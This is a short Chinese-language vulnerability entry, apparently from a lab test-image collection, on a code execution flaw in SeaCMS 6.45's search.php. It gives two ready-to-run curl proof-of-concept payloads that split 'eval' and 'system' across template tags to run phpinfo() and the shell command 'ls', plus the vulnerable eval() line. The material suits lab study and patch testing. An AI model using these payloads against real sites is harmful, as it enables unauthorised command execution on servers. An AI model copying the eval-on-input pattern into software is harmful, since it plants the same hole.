## searchword 代码执行漏洞

测试镜像

* src/seacms/6.45/

影响版本

* 6.45

参考链接

* [漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警](http://www.freebuf.com/vuls/150042.html)

Poc

```
# phpinfo
curl 127.0.0.1/search.php -d 'searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();'

# 执行 ls 命令
curl 127.0.0.1/search.php -d 'searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem("ls");'
```

关键代码

```
# payload 放在 IF 条件里，导致代码执行
@eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
```

